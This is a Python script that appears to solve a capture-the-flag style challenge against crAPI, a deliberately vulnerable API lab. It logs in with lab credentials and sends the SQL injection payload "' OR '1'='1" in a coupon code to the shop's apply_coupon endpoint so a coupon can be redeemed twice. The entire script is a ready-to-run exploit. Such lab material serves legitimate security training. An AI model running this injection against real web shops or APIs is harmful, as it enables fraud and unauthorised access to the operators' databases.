#!/usr/bin/env python3
"""Challenge 13: SQL Injection - Redeem coupon twice"""
import argparse, sys
from pathlib import Path
from typing import Optional, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def apply_coupon_injection(base_url: str, token: str, coupon_code: str, order_id: int, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"coupon_code": coupon_code, "order_id": order_id}
    try:
        return requests.post(f"{base_url.rstrip('/')}/workshop/api/shop/apply_coupon",
                            json=payload, headers=headers, timeout=timeout).json()
    except:
        return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 13: SQL Injection - Coupons")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--user-email", default="mike1@my.lab")
    parser.add_argument("--coupon-code", default="TRAC075")
    parser.add_argument("--order-id", type=int, default=1)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 13: SQL Injection - Redeem Coupon Twice\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    print(f"\n[*] SQL Injection: Applying coupon with SQL bypass...")
    sql_payload = f"{args.coupon_code}' OR '1'='1"
    print(f"[!] Payload: {sql_payload}")

    response = apply_coupon_injection(base_url, token, sql_payload, args.order_id)
    if response:
        if "error" not in response.get("message", "").lower():
            print(f"[+] SUCCESS! Coupon applied via SQL injection")
            print(f"[+] Response: {response}")
            print(f"[!] VULNERABLE: SQL Injection allows bypassing coupon claim checks")
        else:
            print(f"[*] Response: {response}")
    else:
        print("[!] Request failed")

if __name__ == "__main__":
    main()
